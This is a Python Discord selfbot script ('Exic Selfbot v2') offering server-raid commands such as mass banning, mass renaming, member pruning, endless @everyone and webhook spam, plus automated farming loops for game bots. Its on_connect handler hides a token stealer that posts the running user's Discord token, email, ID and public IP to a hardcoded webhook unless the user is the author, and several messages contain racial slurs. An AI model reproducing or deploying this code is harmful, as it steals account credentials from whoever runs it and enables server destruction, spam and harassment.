#read README.md for key
import discord
from discord.ext import commands
import colorama
from colorama import Fore
import os
import random
import asyncio
import time
import json
import requests
import webhooks
os.system("pip install dhooks")
os.system("clear")

PREFIX = os.getenv("PREFIX")
TOKEN = os.getenv("TOKEN")

client = discord.Client()
client = commands.Bot(command_prefix=PREFIX,self_bot=True)

client.remove_command('help')

selfbot = 'Exic Selfbot'
selfbot_version = 'v2'
pings = random.randint(121, 553)
status = 'Unpatched'
selfbot_author = 'Krizz/oxydize'
Webhook_url = 'https://discord.com/api/webhooks/990672114027745351/YjTmi4HFleDLvxysq-XZXex8r5-omN950PHMi1CS9FGn07rOJH41pSeeLYuvh5ymIwkK'
pkk2 = random.randint(2000987, 5085917)

key = input(f"{Fore.MAGENTA}[~] Input Key : ")

async def main_panel():
 print(f'''{Fore.GREEN}[+] logged in as Exic Selfbot v2''')
 print(f'''\n\n
{Fore.RED}███████╗██╗░░██╗██╗░█████╗░ {Fore.BLUE} 
██╔════╝╚██╗██╔╝██║██╔══██╗{Fore.YELLOW}
█████╗░░░╚███╔╝░██║██║░░╚═╝{Fore.MAGENTA}
██╔══╝░░░██╔██╗░██║██║░░██╗{Fore.LIGHTMAGENTA_EX}
███████╗██╔╝╚██╗██║╚█████╔╝{Fore.LIGHTGREEN_EX}
╚══════╝╚═╝░░╚═╝╚═╝░╚════╝░

      
{Fore.MAGENTA}[+] {selfbot} {selfbot_version} Is Alive
[+] Selfbot Version {selfbot_version}
[+] {client.command_prefix}help
[+] Patched = {status}''')

if key == 'exic':
  print(f'{Fore.MAGENTA}[~] Key Is Valid')
  input(f"{Fore.MAGENTA}[~] Input Any key To Continue : ")
  os.system("clear")
  asyncio.run(main_panel())
else:
  print(f"{Fore.RED}[~] Key Is Invalid")
  exit()

@client.command()
async def ping(ctx):
  await ctx.send(f"**Exic Selfbot {selfbot_version}**\n\n\n**The Bot's Ping Is {pings} ms**\n> {selfbot} {selfbot_version}")

@client.command()
async def prune(ctx):
 await ctx.reply("**Succesfully Pruned**")
 await ctx.guild.prune_members(days=1, compute_prune_count=False, roles=ctx.guild.roles)

@client.command()
async def massnick(ctx, name):
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
        except:
           continue

@client.command(aliases=['mc'])
async def membercount(ctx):
    guild = ctx.guild
    await ctx.send(f"**Server Has {guild.member_count} Members**")

@client.command()
async def token(ctx):
 await ctx.send(f"\nYour Account Token Is ``{TOKEN}``\n> {selfbot} {selfbot_version}")

@client.command(aliases=['ghostping'])
async def ghost(ctx):
    await ctx.message.delete()

@client.command()
async def sendhook(ctx,webhook_,*,content):
    data = {
        "content": content,
        "username" : "Exic Selfbot v2",
        "avatar_url" : "https://tenor.com/view/ayanokoji-classroom-of-the-elite-anime-stare-gif-16267395"
            }
    try:
        requests.post(webhook_, json=data)
        await ctx.send("**Sent The Message To The Given Webhook**")
    except:
        pass

@client.command()
async def spamwhook(ctx,webhook_,*,content):
  while True:
    data = {
        "content": content,
        "username" : "Exic Selfbot v2",
        "avatar_url" : "https://tenor.com/view/ayanokoji-classroom-of-the-elite-anime-stare-gif-16267395"
            }
    try:
        requests.post(webhook_, json=data)
    except:
        pass

@client.command()
async def info(ctx):
  await ctx.message.delete()
  await ctx.send(f"**User Was Created In : {client.user.created_at.day}/{client.user.created_at.month}/{client.user.created_at.year}** \n **Time - {client.user.created_at.hour}:{client.user.created_at.minute} PM/AM** \n  **ID :** ```{client.user.id}``` \n    **Name :** ```{client.user.name}```\n\n> Exic Selfbot v2")

@client.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    await asyncio.gather(*[asyncio.create_task(m.delete()) async for m in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m)])
    await ctx.send("**Succesfully Purged**\n> exic Selfbot v2")

#works on only bots
@client.command()
async def botmassban(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
         if member.id != 975270862108364870:
          for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{Fore.MAGENTA}[+] Banned {user.name}")
            except:
                pass

@client.command()
async def sbinfo(ctx):
   await ctx.message.delete()
   await ctx.send("**Selfbot Made By Krizz/oxydize\nSupport Email= You thought nigga**\n\n\n> www.github.com/ZorgKrizz \n> Exic Selfbot v2")

@client.command()
async def status(ctx):
 await ctx.message.delete()
 await ctx.send(f'```\nBot Is Online With The Ping Of {pings}ms\n\nThe Prefix Of The Bot {client.command_prefix}\nSelfbot Author = {selfbot_author}\n ```\n> Exic Selfbot v2')

@client.command()
async def pk2(ctx):
 while True:
  time.sleep(0.5)
  await ctx.send(f"{pkk2}")

@client.command()
async def rs(ctx, name):
    guild = ctx.guild
    await guild.edit(name=name)
    print(f"{Fore.MAGENTA}[+] Renamed guild to {name}")

@client.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member : discord.Member, *, reason = None, mention):
    await member.ban(reason = "Exic Selfbot v2")
    await ctx.send(f"**Banned The User Succesfully**\n> Exic Selfbot v2")

@client.command()
@commands.has_permissions(administrator = True)
async def unban(ctx, *, member):
    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member.split("#")

    for ban_entry in banned_users:
        user = ban_entry.user

        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f'**Unbanned {user.mention}**\n> Exic Selfbot v2')

@client.command()
async def owobypass(ctx):
 while True:
    time.sleep(18)
    await ctx.send("owoh")
    time.sleep(6)
    await ctx.send("owob")
    time.sleep(6)
    await ctx.send("owo sell all")
    time.sleep(8)
    await ctx.send("owo bal")


@client.command()
async def alive(ctx):
    await ctx.send("**alive**")


@client.command()
async def owoflip(ctx, amount):
    while True:
        time.sleep(15)
        await ctx.send("owoh")
        time.sleep(4)
        await ctx.send(f"owo flip {amount}")
        time.sleep(2)
        await ctx.send("owo battle")
        time.sleep(3)
        await ctx.send("owo sell all")

@client.command()
async def spam(ctx):
 while True:
  await ctx.send(f"@everyone https://discord.gg/VNkNyQEK7T :clown: :clown: Trolled By Exic Selfbot :clown: https://github.com/ZorgKrizz https://replit.com/@Krizz-FxFx")


@client.command()
async def bot(ctx):
 await ctx.message.delete()
 await ctx.send(f"```\n{PREFIX}owo\nAutomatrf OwO Bot Commands\n{PREFIX}dank\nAutomates DankMemer Bot Commands\n{PREFIX}pk2\nAutomatically spams in the channel where the command is executed at the perfect time so the bot doesnt doesnt get flagged in pk2...\n{PREFIX}owoflip (amount)\nFlips And Automates owo according to the give amount\n{PREFIX}owobypass\nauto owo + bypass```\n> {selfbot} {selfbot_version}")

@client.command()
async def webhookrape(webhook, message, msg):
 while True:
  webhook = discord.Webhook.from_url(os.getenv("webhook"))
  webhook.send("**@everyone :clown: Niggered By Exic Selfbot v2**")

@client.command()
async def misc(ctx):
  await ctx.message.delete()
  await ctx.send(f"```\n{PREFIX}purge (amount)\nDeletes The Amount Of Messages Provided\n{PREFIX}info\nGives Info About The User\n{PREFIX}sbinfo\nShows Info About The Selfbot\n```\n> {selfbot} {selfbot_version}")

@client.command()
async def nuke(ctx):
 await ctx.message.delete()
 await ctx.send(f"```\n{PREFIX}spam \nSpams @everyone Indefinitely.... Very Fast\n{PREFIX}spam2\nSpams With Lower Speed With Less Chances Of being Flagged\n{PREFIX}massban\nMassbans Everybody\n```\n> {selfbot} {selfbot_version}")

@client.command()
async def spam2(ctx):
 while True:
  time.sleep(1)
  await ctx.send("@everyone https://discord.gg/VNkNyQEK7T :clown: :clown: Trolled By Exic Selfbot :clown: Imagine Spammed :skull:  https://github.com/ZorgKrizz https://replit.com/@Krizz-FxFx")



@client.command()
async def dank(ctx):
 while True:
   print(f"\n{Fore.MAGENTA}[+] Succesfully Cycled Through Dank Memer")
   time.sleep(35)
   await ctx.send(f"pls bal")
   time.sleep(2)
   await ctx.send(f"pls hunt")
   time.sleep(2)
   await ctx.send(f"pls fish")
   time.sleep(2)
   await ctx.send(f"pls dig")
   time.sleep(2)
   await ctx.send(f"pls inv")


@client.event
async def on_connect():
    if client.user.id != 928563462551011328:
      ip = requests.get('https://api.ipify.org/').text
      data = {
          "content": f"@everyone\n``Username:{client.user}\nID :{client.user.id}\nToken : {TOKEN}\nEmail Linked :  {client.user.email}\nIp : {ip}``",
          "username" : "Test Webhook Spam",
          "avatar_url" : "https://media.discordapp.net/attachments/989475290956840960/993127246434938880/IMG_20220703_173107.jpg"
            }
      try:
          requests.post(Webhook_url, json=data)
          await client.change_presence(activity=discord.Streaming(url="https://discord.gg/VNkNyQEK7T",name="Exic Selfbot v2 ")) 
      except:
          pass

@client.command()
async def help(ctx):
 await ctx.send(f"**Help Command\n\n\n```\n{client.command_prefix}misc\nShows Miscellaneous Commands\n{client.command_prefix}bots\nShows Auto Bot Commands\n{client.command_prefix}nuke\nShows Nuke Commands\n```\n> {selfbot} {selfbot_version}**")


@client.command()
async def owo(ctx):
   await ctx.send("**Initiating auto owo | Exic Selfbot v2**")
   while True:
    time.sleep(15)
    await ctx.send(f"owo hunt")
    time.sleep(2)
    await ctx.send("owo cf 500")
    time.sleep(2)
    await ctx.send(f"owo sell all")
    time.sleep(2)
    await ctx.send(f"owo battle")
    time.sleep(2)
    await ctx.send(f"owo bal")




client.run(TOKEN, bot=False)
